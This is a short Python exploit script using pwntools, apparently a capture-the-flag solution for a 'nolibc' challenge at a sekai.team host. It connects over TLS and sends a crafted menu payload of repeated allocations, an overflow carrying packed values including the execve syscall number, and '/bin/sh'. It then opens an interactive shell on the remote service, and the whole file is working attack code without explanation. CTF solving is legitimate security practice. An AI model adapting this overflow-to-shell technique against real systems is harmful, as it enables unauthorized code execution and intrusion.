from pwn import *

r = remote("nolibc.chals.sekai.team", 1337, ssl=True)


def split_string(s, max_bytes=4096):
    chunks = []
    start = 0
    while start < len(s):
        end = start + max_bytes
        if end >= len(s):
            chunks.append(s[start:])
            break

        newline_pos = s.rfind(b"\n", start, end)
        if newline_pos == -1:
            newline_pos = s.find(b"\n", start)
            if newline_pos == -1:
                chunks.append(s[start:])
                break

        chunks.append(s[start : newline_pos + 1])
        start = newline_pos + 1

    return chunks


payload = b"2\na\na\n"
payload += b"1\na\na\n"
payload += (b"1\n128\n" + b"A" * 128 + b"\n") * 305
payload += b"1\n220\n"
payload += b"a" * 0xD0 + p32(0) + p32(1) + p32(59) + b"\n"
payload += b"2\n0\n" * 100
payload += b"5\n/bin/sh\necho STOP\n"

chunks = split_string(payload)
for c in chunks:
    r.send(c)

r.recvuntil(b"STOP")
r.interactive()
